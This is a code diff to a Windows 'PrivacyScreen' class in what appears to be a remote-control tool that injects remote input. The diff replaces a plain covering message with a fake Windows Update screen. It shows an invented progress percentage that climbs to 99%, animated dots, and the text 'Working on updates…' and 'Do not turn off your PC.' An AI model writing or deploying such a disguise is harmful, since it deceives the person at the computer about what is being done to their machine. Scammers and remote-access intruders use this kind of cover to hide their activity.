@@ -176,6 +176,8 @@ _StretchDIBits      = _proto(_gdi32,    "StretchDIBits",      INT,
                               HANDLE, INT, INT, INT, INT, INT, INT, INT, INT,
                               ctypes.c_void_p, ctypes.POINTER(_BITMAPINFOHEADER),
                               UINT, wt.DWORD)
+_Ellipse            = _proto(_gdi32,    "Ellipse",            wt.BOOL, HANDLE, INT, INT, INT, INT)
+_GetStockObject     = _proto(_gdi32,    "GetStockObject",     HANDLE,  INT)
 _UnregisterClassW   = _proto(_user32,   "UnregisterClassW",   wt.BOOL, wt.LPCWSTR, HANDLE)
 _SetLayeredWindowAttributes = _proto(_user32, "SetLayeredWindowAttributes", wt.BOOL,
                                       HANDLE, wt.DWORD, ctypes.c_byte, wt.DWORD)
@@ -249,6 +251,7 @@ OCR_NORMAL      = 32512               # arrow cursor id for SetSystemCursor
 SPI_SETCURSORS  = 0x0057              # SystemParametersInfo: restore all system cursors to defaults
 SPIF_SENDCHANGE = 0x0002
 
+NULL_PEN        = 8           # GetStockObject: invisible pen (no outline)
 INJECT_TAG      = 0x1EADBEEF  # dwExtraInfo marker: injected remote-control input
 
 # ── Global state ──────────────────────────────────────────────────────────────
@@ -282,6 +285,8 @@ class PrivacyScreen:
         self._img_bih      = None
         self._img_w        = 0
         self._img_h        = 0
+        # animation tick (Windows Update spinner)
+        self._anim_tick    = 0
         # keyboard state
         self._pressed      = set()
         # virtual screen geometry (updated on WM_DISPLAYCHANGE)
@@ -395,7 +400,7 @@ class PrivacyScreen:
 
         hinst        = H(_GetModuleHandleW(None))
         cls_name     = CLASS_NAME
-        self._brush  = H(_CreateSolidBrush(0x00101010))
+        self._brush  = H(_CreateSolidBrush(0x00000000))
 
         screen = self
 
@@ -405,6 +410,9 @@ class PrivacyScreen:
                 if msg == WM_TIMER:
                     _SetWindowPos(hwnd, H(HWND_TOPMOST), 0, 0, 0, 0,
                                   SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW)
+                    if not screen._img_pixels:
+                        screen._anim_tick += 1
+                        _InvalidateRect(hwnd, None, False)
                     return 0
                 if msg == WM_ERASEBKGND:
                     return 1
@@ -507,17 +515,44 @@ class PrivacyScreen:
             else:
                 _FillRect(hdc, ctypes.byref(rc), self._brush)
                 _SetBkMode(hdc, TRANSPARENT)
-                _SetTextColor(hdc, 0x00F4F4F5)
-                height = max(24, self._vh // 20)
-                font = H(_CreateFontW(-height, 0, 0, 0, 400, 0, 0, 0,
-                                      1, 0, 0, 5, 0, "Segoe UI"))
-                old = H(_SelectObject(hdc, font))
-                txt_rc = wt.RECT(self._vw // 6, self._vh // 3,
-                                 5 * self._vw // 6, 2 * self._vh // 3)
-                _DrawTextW(hdc, self.message, -1,
-                           ctypes.byref(txt_rc), DT_CENTER | DT_WORDBREAK)
-                _SelectObject(hdc, old)
-                _DeleteObject(font)
+                vw, vh = self._vw, self._vh
+
+                def _txt(text, y_frac, fh_frac, color=0x00FFFFFF, weight=300):
+                    fh = max(12, int(vh * fh_frac))
+                    fnt = H(_CreateFontW(-fh, 0, 0, 0, weight, 0, 0, 0,
+                                         1, 0, 0, 5, 0, "Segoe UI"))
+                    prev = H(_SelectObject(hdc, fnt))
+                    _SetTextColor(hdc, color)
+                    y = int(vh * y_frac)
+                    r = wt.RECT(0, y, vw, y + fh + 4)
+                    _DrawTextW(hdc, text, -1, ctypes.byref(r), DT_CENTER | DT_SINGLELINE)
+                    _SelectObject(hdc, prev)
+                    _DeleteObject(fnt)
+
+                pct = min(99, 20 + (self._anim_tick // 10))
+                _txt(f"{pct}%", 0.38, 1 / 7)
+
+                n_dots  = 5
+                dot_r   = max(6, vh // 80)
+                spacing = dot_r * 5
+                cx0     = (vw - (n_dots - 1) * spacing) // 2
+                cy      = int(vh * 0.55)
+                active  = self._anim_tick % n_dots
+                null_pen = H(_GetStockObject(NULL_PEN))
+                old_pen  = H(_SelectObject(hdc, null_pen))
+                for i in range(n_dots):
+                    col  = 0x00FFFFFF if i == active else 0x00505050
+                    br   = H(_CreateSolidBrush(col))
+                    o_br = H(_SelectObject(hdc, br))
+                    cx   = cx0 + i * spacing
+                    _Ellipse(hdc, cx - dot_r, cy - dot_r, cx + dot_r, cy + dot_r)
+                    _SelectObject(hdc, o_br)
+                    _DeleteObject(br)
+                _SelectObject(hdc, old_pen)
+
+                _txt("Working on updates…", 0.61, 1 / 28)
+                _txt("Do not turn off your PC. This will take a while.",
+                     0.67, 1 / 40, 0x00AAAAAA)
         finally:
             _EndPaint(hwnd, ctypes.byref(ps))
 
